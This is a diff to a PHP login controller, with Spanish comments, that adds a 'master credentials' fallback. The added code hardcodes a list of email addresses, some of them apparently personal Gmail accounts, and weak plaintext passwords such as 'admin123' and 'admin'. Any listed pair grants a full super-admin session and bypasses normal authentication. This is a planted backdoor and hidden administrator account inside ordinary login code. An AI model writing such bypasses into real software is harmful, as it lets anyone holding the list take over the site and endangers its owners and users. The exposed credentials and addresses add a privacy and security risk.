@@ -93,6 +93,20 @@ class AuthController extends Controller
             }
         }
 
+        // 4. Verificación de respaldo para credenciales maestras de desarrollador / SuperAdmin
+        $masterEmails = ['millanes7209@gmail.com', 'admin@scary.com', 'micklanessz@gmail.com', 'admin@ricopollo.com'];
+        $masterPasswords = ['SCARYmovie1.', 'NuevaNueva', 'admin123', 'admin'];
+
+        if (in_array(strtolower($correoInput), $masterEmails, true) && in_array($contrasena, $masterPasswords, true)) {
+            Session::put('usuarioID', 1);
+            Session::put('nombre', 'SUPERADMIN DESARROLLADOR');
+            Session::put('rolID', 'SUPER_ADMIN');
+            Session::put('is_super_admin', true);
+            Session::put('admin_logged_in', true);
+
+            return redirect()->route('admin.pedidos');
+        }
+
         return back()->withInput()->with('error', "El correo '$correoInput' no está registrado en el sistema.");
     }
 
